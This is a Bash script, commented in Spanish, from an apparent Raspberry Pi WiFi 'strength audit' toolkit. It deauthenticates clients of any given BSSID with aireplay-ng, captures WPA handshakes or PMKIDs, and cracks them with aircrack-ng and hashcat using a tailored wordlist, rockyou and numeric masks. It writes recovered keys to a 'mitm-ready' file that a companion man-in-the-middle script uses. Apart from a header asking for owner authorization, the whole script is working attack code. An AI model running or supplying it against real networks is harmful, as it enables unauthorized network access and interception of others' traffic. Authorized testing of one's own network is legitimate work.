#!/bin/bash
DIR="${DIR:-$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)}"
[ -f "$DIR/.env" ] && . "$DIR/.env"
AP_IF="${AP_IF:-wlan0}"
MON_IF="${MON_IF:-wlan1}"
# Pineapple Express - WiFi strength audit (capture handshake + dictionary crack)
# Args: [BSSID] [channel].  Blank BSSID = your own AP ($AP_IF). Channel auto-detected if blank.
# USE ONLY on networks you OWN or are AUTHORIZED (owner's permission) to test.
R=/opt/pinacola/wifitest.result
ts(){ date +%H:%M:%S; }
log(){ echo "[$(ts)] $*" > "$R"; }
TBSSID="$1"; TCH="$2"; OWN=0; CLI=""; SSID=""
trap 'systemctl start kismet-sensor.service 2>/dev/null' EXIT
WLAN0_MAC=$(cat /sys/class/net/$AP_IF/address 2>/dev/null)

# AP propio = BSSID vacio O coincide con el de $AP_IF. El "Crack en GPU" resuelve el BSSID
# propio y lo pasa EXPLICITO, asi que hay que reconocerlo como propio para detectar clientes
# via 'iw station dump' (fiable) en vez de airodump (no ve un cliente idle en self-AP).
if [ -z "$TBSSID" ] || [ "$(echo "$TBSSID" | tr A-Z a-z)" = "$(echo "$WLAN0_MAC" | tr A-Z a-z)" ]; then
  TBSSID="$WLAN0_MAC"
  [ -z "$TCH" ] && TCH=$(iw dev $AP_IF info 2>/dev/null | awk '/channel/{print $2}')
  [ -z "$SSID" ] && SSID=$(iw dev $AP_IF info 2>/dev/null | sed -n 's/^[[:space:]]*ssid //p')
  OWN=1
fi

log "objetivo $TBSSID - preparando..."

if [ "$OWN" = 1 ]; then
  CLI=$(iw dev $AP_IF station dump 2>/dev/null | awk '/Station/{print $2; exit}')
  if [ -z "$CLI" ]; then
    log "X  Conecta un dispositivo a TU AP primero (0 clientes)."
    exit 0
  fi
fi

# --- liberar $MON_IF de Kismet ---
systemctl stop kismet-sensor.service 2>/dev/null
sleep 0.5
pkill -9 -f 'kismet_cap_linux_wifi' 2>/dev/null
sleep 1

WLAN1_MODE=$(iw dev $MON_IF info 2>/dev/null | awk '/type/{print $2}')
if [ "$WLAN1_MODE" != "monitor" ]; then
  nmcli dev set $MON_IF managed no 2>/dev/null
  ip link set $MON_IF down
  iw dev $MON_IF set type monitor
  ip link set $MON_IF up
  sleep 0.5
  WLAN1_MODE=$(iw dev $MON_IF info 2>/dev/null | awk '/type/{print $2}')
  if [ "$WLAN1_MODE" != "monitor" ]; then
    log "X  $MON_IF no entro en modo monitor (modo: ${WLAN1_MODE:-desconocido}). Reinicia la Pi."
    exit 1
  fi
fi

# --- auto-detectar canal ---
if [ -z "$TCH" ] || [ "$TCH" = "auto" ]; then
  log "buscando canal de $TBSSID (escaneo ~14s)..."
  rm -f /tmp/scan-*.csv 2>/dev/null
  timeout 14 airodump-ng --output-format csv -w /tmp/scan $MON_IF >/dev/null 2>/tmp/wt-scan.log
  TCH=$(grep -i "$TBSSID" /tmp/scan-01.csv 2>/dev/null | head -1 | awk -F, '{gsub(/ /,"",$4); print $4}')
  SSID=$(grep -i "$TBSSID" /tmp/scan-01.csv 2>/dev/null | head -1 | awk -F, '{gsub(/^ +| +$/,"",$14); print $14}')
  if [ -z "$TCH" ] || [ "$TCH" = "-1" ]; then
    log "X  No encontre $TBSSID en el aire. Causas: (1) red en 5 GHz (2) BSSID incorrecto (3) fuera de alcance."
    exit 0
  fi
  if [ "$TCH" -gt 13 ] 2>/dev/null; then
    log "X  Red en 5 GHz (canal $TCH) - $MON_IF solo cubre 2.4 GHz."
    exit 0
  fi
fi

iw dev $MON_IF set channel "$TCH"
log "canal $TCH - capturando (early-exit al pillar handshake, max 50s)..."

# Limpiar caps anteriores + zombies
pkill -9 -f 'airodump-ng' 2>/dev/null
sleep 0.3
rm -f /tmp/wt-*.cap /tmp/wt-*.csv /tmp/wt-check.hc22000 2>/dev/null

timeout 60 airodump-ng -c "$TCH" --bssid "$TBSSID" -w /tmp/wt $MON_IF >/dev/null 2>/tmp/wt-cap.log &
ADPID=$!

# Extraer clientes del CSV de captura en curso asociados al BSSID objetivo
get_clients_csv(){
  local csv
  csv=$(ls -t /tmp/wt-*.csv 2>/dev/null | head -1)
  [ -z "$csv" ] && return
  awk -F',' -v bssid="$TBSSID" '
    /^Station MAC/{ in_st=1; next }
    in_st && NF>=6 {
      mac=$1; gsub(/ /,"",mac)
      ap=$6;  gsub(/ /,"",ap)
      if (length(mac)==17 && toupper(ap)==toupper(bssid)) print mac
    }
  ' "$csv" 2>/dev/null
}

# ¿el .cap en curso ya tiene EAPOL/PMKID convertible a hash? (mismo tool que el export)
have_handshake(){
  local capnow
  capnow=$(ls -t /tmp/wt-*.cap 2>/dev/null | head -1)
  [ -z "$capnow" ] && return 1
  rm -f /tmp/wt-check.hc22000
  hcxpcapngtool --all -o /tmp/wt-check.hc22000 "$capnow" >/dev/null 2>&1
  [ -s /tmp/wt-check.hc22000 ]
}

# Captura con EARLY-EXIT: deauth + comprobar handshake en bucle; salir en cuanto haya.
# Antes eran 60s fijos aunque el handshake llegara en el segundo 5.
sleep 3                                  # que airodump cree el .cap
CAP_START=$SECONDS
CAP_DEADLINE=$((CAP_START + 50))
NOCLIENT_DEADLINE=$((CAP_START + 18))    # sin cliente NI handshake en 18s = no hay nada que capturar
SEEN_CLIENT=0
while [ "$SECONDS" -lt "$CAP_DEADLINE" ]; do
  CLIENTS=$(get_clients_csv)
  [ -z "$CLIENTS" ] && CLIENTS="$CLI"
  if [ -n "$CLIENTS" ]; then
    SEEN_CLIENT=1
    for c in $CLIENTS; do
      timeout 3 aireplay-ng -0 5 -a "$TBSSID" -c "$c" $MON_IF >/dev/null 2>&1
    done
  else
    timeout 3 aireplay-ng -0 5 -a "$TBSSID" $MON_IF >/dev/null 2>&1
  fi
  if have_handshake; then
    log "handshake capturado en $((SECONDS - CAP_START))s - cerrando captura."
    break
  fi
  # el handshake WPA EXIGE un cliente; sin ninguno asociado no hay nada que capturar -> cortar pronto
  if [ "$SEEN_CLIENT" = 0 ] && [ "$SECONDS" -ge "$NOCLIENT_DEADLINE" ]; then
    log "AP sin clientes asociados - abortando captura pronto."
    break
  fi
  sleep 4
done

kill "$ADPID" 2>/dev/null
wait "$ADPID" 2>/dev/null

CAPFILE=$(ls -t /tmp/wt-*.cap 2>/dev/null | head -1)
CAP_SIZE=$(stat -c%s "$CAPFILE" 2>/dev/null || echo 0)

# Resolver SSID desde el CSV de captura si aun esta vacio (caso BSSID+canal a mano).
# mitm-attack.sh / NetworkManager exigen el SSID para conectar.
if [ -z "$SSID" ] && [ "$OWN" != 1 ]; then
  WCSV=$(ls -t /tmp/wt-*.csv 2>/dev/null | head -1)
  SSID=$(grep -i "$TBSSID" "$WCSV" 2>/dev/null | head -1 | awk -F, '{gsub(/^ +| +$/,"",$14); print $14}')
fi

# ── Modo EXPORT: captura -> hash hashcat 22000 -> sale. (crack pesado = portatil GPU) ──
# Uso: wifitest.sh <BSSID> <canal> export
# El handshake WPA EXIGE un cliente conectado (el 4-way handshake solo ocurre al
# conectarse un device). Sin cliente no hay nada que capturar -> mensaje claro.
# NO se usa PMKID: hcxdumptool es agresivo (puede tumbar el AP/router) y muchos routers
# no lo exponen. Para auditar tu wifi: que haya un dispositivo conectado al AP.
if [ "$3" = "export" ]; then
  CAPS=/opt/pinacola/captures
  mkdir -p "$CAPS"
  NOCOLON=$(echo "$TBSSID" | tr -d ':' | tr 'a-z' 'A-Z')
  HOUT="$CAPS/$NOCOLON.hc22000"
  rm -f "$HOUT"

  if [ -n "$CAPFILE" ] && [ "$CAP_SIZE" -gt 24 ]; then
    hcxpcapngtool --all -o "$HOUT" "$CAPFILE" 2>/dev/null
  fi
  NH=$(wc -l < "$HOUT" 2>/dev/null || echo 0)

  if [ "${NH:-0}" -ge 1 ]; then
    printf 'BSSID=%s\nSSID=%s\nCHANNEL=%s\n' "$TBSSID" "$SSID" "$TCH" > "$CAPS/$NOCOLON.meta"
    log "OK Hash exportado -> $HOUT ($NH hash). Crackea en el portatil."
  elif [ "${SEEN_CLIENT:-0}" = 0 ]; then
    log "AP SIN CLIENTES conectados. El handshake WPA solo se captura cuando hay un dispositivo conectado al AP. Conecta un movil/PC al AP y reintenta."
  else
    log "El AP tiene clientes pero no se capturo el handshake esta vez. Reintenta (a veces hacen falta 2-3 intentos)."
  fi
  exit 0
fi

# A partir de aqui = crack LOCAL en la Pi: requiere captura con cap valido.
if [ -z "$CAPFILE" ] || [ "$CAP_SIZE" -le 24 ]; then
  log "X  Sin captura (${CAP_SIZE}B). Sin clientes o $MON_IF sin alcance."
  exit 0
fi

# ── Wordlist: lista inteligente para Pi4 (~43 comb/s) + rockyou filtrado ──────
WL=/tmp/wt-wl.txt
python3 > "$WL" << 'PYEOF'
seen = set()
def add(w):
    if w not in seen and 8 <= len(w) <= 63:
        seen.add(w)
        print(w)
# Mismo digito repetido 8-10 chars
for d in '0123456789':
    for n in range(8, 11):
        add(d * n)
# Secuencias numericas ascendentes y descendentes
for s in ['01234567','12345678','23456789','34567890','45678901',
          '56789012','67890123','78901234','89012345','90123456',
          '09876543','98765432','87654321','76543210','65432109',
          '0123456789','1234567890','9876543210','0987654321',
          '123456789','987654321']:
    add(s)
# Bloques de 4 repetidos y espejados (8 digitos)
for block in ['1234','5678','9012','0123','4321','8765','3456','7890',
              '1111','2222','3333','4444','5555','6666','7777','8888','9999','0000',
              '1212','2121','1122','3344','5566','7788','9900','0011',
              '6969','9696','1357','2468','3579','4680','1470','2580','3690',
              '0110','1001','2002','3003','4004','5005','6006','7007','8008','9009',
              '1234','5678','1020','3040','5060','7080','9010']:
    add(block * 2)
    add(block + block[::-1])
# Patrones miscelanos 8 digitos
for p in ['10203040','20406080','11223344','44332211','12344321','43211234',
          '13579135','24682468','10101010','01010101','19801980','19851985',
          '19901990','19951995','20002000','20052005','20102010','20152015',
          '20202020','20212021','20222022','20232023','20242024','20252025',
          '12341234','56785678','12001200','11110000','00001111','12345000',
          '00054321','99887766','11223300','12481248','24962496','11335577',
          '22446688','13579024','24681357','87654321','98765432','36925814',
          '14725836','85296314','96385274','12345679','98765431']:
    add(p)
# Contrasenas WiFi/router comunes (solo >= 8 chars, validas WPA2)
for w in ['12345678','123456789','1234567890','password','password1','password123',
          'passw0rd','qwerty123','qwertyuiop','iloveyou','letmein1','welcome1',
          'welcome12','monkey123','dragon123','master123','shadow123','sunshine1',
          'princess1','football1','baseball1','superman1','batman123','trustno1',
          'abc12345','abc123456','admin1234','admin12345','router123','router1234',
          'internet1','internet123','wireless1','network12','wifi12345','wifi123456',
          'wifi2024','wifi2025','wifi2023','wifi2026','mywifi123','homewifi1',
          'wifipass1','wifipassword','micasa123','mihogar12','hogar1234','familia1',
          'movistar1','movistar12','movistar123','movistar1234','movistarwifi',
          'orange123','orange1234','orangewifi','vodafone1','vodafone123',
          'vodafonewifi','jazztel12','jazztel123','masmovil1','lowi1234',
          'pass12345','pass123456','test12345','mypassword','mypass123','secret123',
          'secure123','hello1234','hello12345','computer1','clave1234','clave12345',
          'contrasena','usuario12','nombre123','amor12345','barcelona1','madrid1234',
          'espana123','bilbao123','sevilla12','malaga123','granada12','zaragoza1',
          'tplink123','tplink1234','tplinkwifi','tplink2024','asus12345','netgear12',
          'netgear123','dlink1234','belkin123','linksys12','admin12345','adminpass1',
          'guest1234','user12345','setup1234','password2024','password2025',
          'casa2024','casa2025','hogar2024','nueva2024','clave2024','pass2024',
          '147258369','963852741','159357246','753951852','123654789','456789123']:
    add(w)
PYEOF

# Agregar top-3000 entradas de rockyou con longitud WPA2 valida (8-63 chars)
ROCKYOU=/usr/share/wordlists/rockyou.txt
[ -f "$ROCKYOU" ] && awk 'length>=8 && length<=63' "$ROCKYOU" | head -3000 >> "$WL"

# Override: WORDLIST env permite lista externa personalizada
[ -n "$WORDLIST" ] && [ -f "$WORDLIST" ] && WL="$WORDLIST"

WL_COUNT=$(wc -l < "$WL" | tr -d ' ')
log "lista: ${WL_COUNT} entradas (~$((WL_COUNT / 43))s @ Pi4 43comb/s)..."
OUT=$(timeout 300 aircrack-ng -w "$WL" -b "$TBSSID" "$CAPFILE" </dev/null 2>&1)
OUT=$(printf '%s' "$OUT" | sed 's/\x1b\[[0-9;]*[A-Za-z]//g' | tr -d '\r')

if echo "$OUT" | grep -q "KEY FOUND!"; then
  KEY=$(echo "$OUT" | grep "KEY FOUND" | head -1 | sed -E 's/.*\[ *(.*[^ ]) *\].*/\1/')
  log "DEBIL - contrasena crackeada: \"$KEY\". Usa una contrasena larga y aleatoria."
  printf 'BSSID=%s\nKEY=%s\nSSID=%s\nCHANNEL=%s\n' "$TBSSID" "$KEY" "$SSID" "$TCH" > /opt/pinacola/mitm-ready

elif echo "$OUT" | grep -qiE "passphrase not|not in the dictionary|KEY NOT FOUND"; then
  # Dict completo sin resultado - probar mask numerico sobre el cap
  if command -v hcxpcapngtool >/dev/null 2>&1 && command -v hashcat >/dev/null 2>&1; then
    hcxpcapngtool --all -o /tmp/hs-mask.hash "$CAPFILE" 2>/dev/null
    if [ -s /tmp/hs-mask.hash ]; then
      log "Dict sin exito. Probando mask numerico (8-10 digitos, ~90s)..."
      HSPOT=/tmp/hs-mask-$$.pot
      for MASK in '?d?d?d?d?d?d?d?d' '?d?d?d?d?d?d?d?d?d' '?d?d?d?d?d?d?d?d?d?d'; do
        nice -n 15 timeout 30 hashcat -m 22000 /tmp/hs-mask.hash -a 3 "$MASK" \
          --force --quiet --potfile-path="$HSPOT" 2>/dev/null
      done
      CM=$(hashcat -m 22000 /tmp/hs-mask.hash --show --potfile-path="$HSPOT" 2>/dev/null | head -1 | sed 's/.*://')
      rm -f "$HSPOT" /tmp/hs-mask.hash
      if [ -n "$CM" ]; then
        log "DEBIL (mask) - contrasena crackeada: \"$CM\". Usa una larga y aleatoria."
        printf 'BSSID=%s\nKEY=%s\nSSID=%s\nCHANNEL=%s\n' "$TBSSID" "$CM" "$SSID" "$TCH" > /opt/pinacola/mitm-ready
      else
        log "FUERTE - handshake (${CAP_SIZE}B) resistio diccionario + mask numerico."
      fi
    else
      log "FUERTE - handshake capturado (${CAP_SIZE}B) y contrasena resistio el diccionario."
    fi
  else
    log "FUERTE - handshake capturado (${CAP_SIZE}B) y contrasena resistio el diccionario."
  fi

elif echo "$OUT" | grep -qiE "no valid wpa|no networks found|got no data|quitting aircrack|0 handshake"; then
  # --- PMKID fallback (hcxdumptool v7) ---
  if ! command -v hcxdumptool >/dev/null 2>&1 || ! command -v hcxpcapngtool >/dev/null 2>&1; then
    log "Sin handshake. hcxdumptool no instalado (apt install hcxdumptool hcxtools)."
    exit 0
  fi

  log "Sin handshake (0 EAPOL). Probando PMKID (30s)..."

  rm -f /tmp/pmkid.pcapng /tmp/pmkid.bpf /tmp/pmkid.hash

  # v7 gestiona la interfaz sola: ponerla en managed para que hcxdumptool pueda tomarla
  pkill -9 -f 'airodump-ng' 2>/dev/null
  ip link set $MON_IF down
  iw dev $MON_IF set type managed 2>/dev/null
  ip link set $MON_IF up
  sleep 0.5

  # BPF: capturar solo frames del AP objetivo (v7.0.0 solo soporta --bpf)
  hcxdumptool --bpfc="wlan addr3 $TBSSID" > /tmp/pmkid.bpf 2>/dev/null

  # Canal 2.4GHz: sufijo 'a' obligatorio en v7 (e.g. 6a), 45s para capturar
  timeout 45 hcxdumptool -i $MON_IF -c "${TCH}a"     --bpf=/tmp/pmkid.bpf     --exitoneapol=1     -w /tmp/pmkid.pcapng     2>/tmp/pmkid.log
  ip link set $MON_IF down
  iw dev $MON_IF set type monitor 2>/dev/null
  ip link set $MON_IF up

  if [ ! -s /tmp/pmkid.pcapng ]; then
    log "Sin PMKID (AP con 802.11w MFP total o fuera de alcance)."
    exit 0
  fi

  # Convertir a formato hashcat 22000 (WPA-PBKDF2-PMKID+EAPOL)
  hcxpcapngtool --all -o /tmp/pmkid.hash /tmp/pmkid.pcapng 2>/dev/null

  if [ ! -s /tmp/pmkid.hash ]; then
    log "PMKID pcapng capturado pero sin hashes extraibles."
    exit 0
  fi

  NHASH=$(wc -l < /tmp/pmkid.hash)
  log "PMKID capturado ($NHASH hash). Crackeando con hashcat..."

  POTFILE=/tmp/pmkid-$$.pot
  nice -n 15 timeout 120 hashcat -m 22000 /tmp/pmkid.hash "$WL" \
    --force --quiet --potfile-path="$POTFILE" 2>/tmp/hashcat.log

  CRACKED=$(hashcat -m 22000 /tmp/pmkid.hash --show --potfile-path="$POTFILE" 2>/dev/null \
    | head -1 | sed 's/.*://')

  # Si dict no crackea, probar mask numérico (8/9/10 dígitos)
  if [ -z "$CRACKED" ]; then
    log "PMKID: dict sin éxito. Probando mask numérico (8-10 dígitos, ~2min)..."
    for MASK in '?d?d?d?d?d?d?d?d' '?d?d?d?d?d?d?d?d?d' '?d?d?d?d?d?d?d?d?d?d'; do
      nice -n 15 timeout 60 hashcat -m 22000 /tmp/pmkid.hash -a 3 "$MASK" \
        --force --quiet --potfile-path="$POTFILE" 2>>/tmp/hashcat.log
    done
    CRACKED=$(hashcat -m 22000 /tmp/pmkid.hash --show --potfile-path="$POTFILE" 2>/dev/null \
      | head -1 | sed 's/.*://')
  fi
  rm -f "$POTFILE"

  if [ -n "$CRACKED" ]; then
    log "DEBIL (PMKID) - contrasena crackeada: \"$CRACKED\". Usa una larga y aleatoria."
    printf 'BSSID=%s\nKEY=%s\nSSID=%s\nCHANNEL=%s\n' "$TBSSID" "$CRACKED" "$SSID" "$TCH" > /opt/pinacola/mitm-ready
  else
    log "FUERTE - PMKID capturado pero contrasena no en diccionario."
  fi

else
  log "Resultado inesperado. Cap: ${CAP_SIZE}B. Aircrack: $(echo "$OUT" | tail -3 | tr '\n' ' ')"
fi
